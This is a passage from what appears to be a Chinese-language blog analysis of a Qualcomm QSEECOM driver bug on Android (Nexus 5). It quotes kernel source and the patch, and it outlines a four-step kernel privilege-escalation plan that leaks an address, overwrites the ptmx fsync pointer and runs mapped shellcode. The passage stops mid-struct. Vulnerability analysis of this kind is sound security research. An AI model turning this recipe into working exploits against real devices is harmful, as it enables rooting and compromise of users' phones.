&lt;p&gt;QSEECOM驱动程序提供了ioctl系统调用接口，用于用户空间客户端的通讯。&lt;br&gt;QSEECOM driver的drivers/misc/qseecom.c没有验证ioctl调用中的某些偏移、长度、基值，攻击者通过构造的应用，利用此漏洞可获取提升的权限或造成拒绝服务。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;分析环境与工具&quot;&gt;&lt;a href=&quot;#分析环境与工具&quot; class=&quot;headerlink&quot; title=&quot;分析环境与工具&quot;&gt;&lt;/a&gt;分析环境与工具&lt;/h2&gt;&lt;p&gt;Android版本：Android4.4.4_r1&lt;br&gt;内核版本：kernel_msm-android-msm-hammerhead-3.4-kitkat-mr1&lt;br&gt;手机：Nexus5&lt;/p&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h2&gt;&lt;p&gt;接下来我将结合retme在xkungfoo2015安全会议做出的报告对该漏洞的exploit原理进行详细分析。看一下codeaurora对该漏洞的简介：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The qseecom driver provides an ioctl system call interface to user space clients for communication. When processing this communication, the __qseecom_update_cmd_buf function uses the user-supplied value cmd_buf_offset as an index to a buffer for write operations without any boundary checks, allowing a local application with access to the qseecom device node to, e.g., escalate privileges.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;显然问题出在__qseecom_update_cmd_buf函数没有对用户传入的参数进行边界检查，导致了内存破坏。对该漏洞的patch时在函数入口添加了一个边界检查的函数：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;boundary_checks_offset&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; qseecom_send_modfd_cmd_req *cmd_req,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; qseecom_send_modfd_listener_resp *lstnr_resp,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; qseecom_dev_handle *data, &lt;span class=&quot;keyword&quot;&gt;bool&lt;/span&gt; listener_svc,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; ret = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((!listener_svc) &amp;amp;&amp;amp; (cmd_req-&amp;gt;ifd_data[i].fd &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (cmd_req-&amp;gt;ifd_data[i].cmd_buf_offset &amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			cmd_req-&amp;gt;cmd_req_len - &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			pr_err(&lt;span class=&quot;string&quot;&gt;&quot;Invalid offset 0x%x\n&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				cmd_req-&amp;gt;ifd_data[i].cmd_buf_offset);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ++ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((listener_svc) &amp;amp;&amp;amp; (lstnr_resp-&amp;gt;ifd_data[i].fd &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (lstnr_resp-&amp;gt;ifd_data[i].cmd_buf_offset &amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			lstnr_resp-&amp;gt;resp_len - &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			pr_err(&lt;span class=&quot;string&quot;&gt;&quot;Invalid offset 0x%x\n&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				lstnr_resp-&amp;gt;ifd_data[i].cmd_buf_offset);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ++ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;查看__qseecom_update_cmd_buf函数源码：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; __qseecom_update_cmd_buf(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;qseecom_send_modfd_cmd_req *req,...)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* Get the handle of the shared fd */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ihandle = ion_import_dma_buf(qseecom.ion_clnt, req-&amp;gt;ifd_data[i].fd);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (IS_ERR_OR_NULL(ihandle)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		pr_err(&lt;span class=&quot;string&quot;&gt;&quot;Ion client can&#39;t retrieve the handle\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; -ENOMEM;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	field = (&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *) req-&amp;gt;cmd_req_buf + req-&amp;gt;ifd_data[i].cmd_buf_offset;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;/* Populate the cmd data structure with the phys_addr */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	sg_ptr = ion_sg_table(qseecom.ion_clnt, ihandle);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	update = (&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; *) field;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (cleanup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		*update = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		*update = (&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt;)sg_dma_address(sg_ptr-&amp;gt;sgl);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里我隐藏了无关的代码，只贴出了涉及本漏洞的部分。req-&amp;gt;cmd_req_buf为用户态传入的缓冲区基地址，req-&amp;gt;ifd_data[i].cmd_buf_offset为相对于req_buf的偏移，sg_dma_address返回一个物理地址。值得注意的是，req-&amp;gt;cmd_req_buf和req-&amp;gt;ifd_data[i].cmd_buf_offset的值都是用户态传入的，并且没有任何限制。&lt;/p&gt;
&lt;p&gt;假定sg_dma_address(sg_ptr-&amp;gt;sgl)返回的是一个固定的物理地址，如0x3*******，我们可以构造出该漏洞的利用思路：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;构造用户态参数，调用ioctl触发__qseecom_update_cmd_buf函数，将0x3*******泄露回用户态，得到确切地址；&lt;/li&gt;
&lt;li&gt;构造用户态参数，再次调用ioctl触发__qseecom_update_cmd_buf函数，覆盖ptmx_fops结构体的fsync函数指针；&lt;/li&gt;
&lt;li&gt;在0x3*******地址mmap一段空间，并布置相应的shellcode；&lt;/li&gt;
&lt;li&gt;调用fsync(/dev/ptmx)触发内核调用shellcode，完成提权；&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;首先来看如何在用户态触发req-&amp;gt;cmd_req_buf函数，搜索__qseecom_update_cmd_buf：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;qseecom_send_modfd_cmd&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; qseecom_dev_handle *data,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; __user *argp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; ret = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; qseecom_send_modfd_cmd_req req;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; qseecom_send_cmd_req send_cmd_req;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ret = copy_from_user(&amp;amp;req, argp, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(req));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ret) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		pr_err(&lt;span class=&quot;string&quot;&gt;&quot;copy_from_user failed\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	send_cmd_req.cmd_req_buf = req.cmd_req_buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	send_cmd_req.cmd_req_len = req.cmd_req_len;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	send_cmd_req.resp_buf = req.resp_buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	send_cmd_req.resp_len = req.resp_len;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ret = __qseecom_update_cmd_buf(&amp;amp;req, &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ret = __qseecom_send_cmd(data, &amp;amp;send_cmd_req);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ret = __qseecom_update_cmd_buf(&amp;amp;req, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	pr_debug(&lt;span class=&quot;string&quot;&gt;&quot;sending cmd_req-&amp;gt;rsp size: %u, ptr: 0x%p\n&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			req.resp_len, req.resp_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;继续找qseecom_send_modfd_cmd的上层调用：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;qseecom_ioctl&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; file *file, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; cmd,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; arg)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; QSEECOM_IOCTL_SEND_MODFD_CMD_REQ: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;/* Only one client allowed here at a time */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mutex_lock(&amp;amp;app_access_lock);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		atomic_inc(&amp;amp;data-&amp;gt;ioctl_count);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		ret = qseecom_send_modfd_cmd(data, argp);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		atomic_dec(&amp;amp;data-&amp;gt;ioctl_count);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		wake_up_all(&amp;amp;data-&amp;gt;abort_wq);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mutex_unlock(&amp;amp;app_access_lock);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			pr_err(&lt;span class=&quot;string&quot;&gt;&quot;failed qseecom_send_cmd: %d\n&quot;&lt;/span&gt;, ret);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;到这里就可以知道，命令码为QSEECOM_IOCTL_SEND_MODFD_CMD_REQ的ioctl函数调用，就可以触发qseecom驱动层__qseecom_update_cmd_buf函数。&lt;br&gt;让我们考虑如何构造用户态参数的问题，先贴出要用到的结构体：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * struct qseecom_ion_fd_info - ion fd handle data information&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * @fd - ion handle to some memory allocated in user space&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * 